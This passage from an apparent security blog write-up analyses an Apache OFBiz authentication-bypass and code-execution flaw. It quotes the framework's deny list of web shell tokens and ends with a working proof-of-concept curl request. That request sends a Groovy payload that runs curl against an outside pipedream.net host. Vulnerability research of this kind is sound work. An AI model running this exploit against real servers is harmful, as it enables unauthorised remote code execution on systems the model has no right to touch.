623:   public static boolean isValidText(String content, List<String> allowed) throws IOException {
624:       return DENIEDWEBSHELLTOKENS.stream().allMatch(token -> isValid(content, token, allowed));
625:   }
.
.
644:   private static List<String> deniedWebShellTokens() {
645:       String deniedTokens = UtilProperties.getPropertyValue("security", "deniedWebShellTokens");
646:       return UtilValidate.isNotEmpty(deniedTokens) ? StringUtil.split(deniedTokens, ",") : new ArrayList<>();
647:   }
{%endhighlight%}

isValidText() internally called `DENIEDWEBSHELLTOKENS.stream()` which is nothing but `deniedWebShellTokens()` function which seems to be returning based on some pre-defined property value.

**File**: *ofbiz-framework-release18.12.05/framework/security/config/security.properties*
{% highlight bash lineos %}
deniedWebShellTokens=freemarker,import=\"java,runtime.getruntime().exec(,<%@ page,<script,<body>,<form,php,javascript,%eval,@eval,import os,passthru,exec,shell_exec,assert,str_rot13,system,phpinfo,base64_decode,chmod,mkdir,fopen,fclose,new file,import,upload,getfilename,download,getoutputstring,readfile
{%endhighlight%}

This seems like a simple blacklist based filtering, bypassing which will give us direct code execution. 

## POC

{% highlight bash lineos %}
curl -vv -X POST "https://localhost:8443/webtools/control/ProgramExport?USERNAME&PASSWORD=test&requirePasswordChange=Y" -d 'groovyProgram=def%20result%20%3D%20%22curl%20https%3A%2F%2Fen3d5squ4eacq.x.pipedream.net%22.execute().text%3B' --insecure
{%endhighlight%}

## References:

1. [packtpub](https://subscription.packtpub.com/book/programming/9781847199188/1/ch01lvl1sec10/locating-an-ofbiz-component){:target="_blank"}

2. [y4tacker.github.io](https://y4tacker.github.io/2023/12/27/year/2023/12/Apache-OFBiz%E6%9C%AA%E6%8E%88%E6%9D%83%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%B5%85%E6%9E%90-CVE-2023-51467/){:target="_blank"}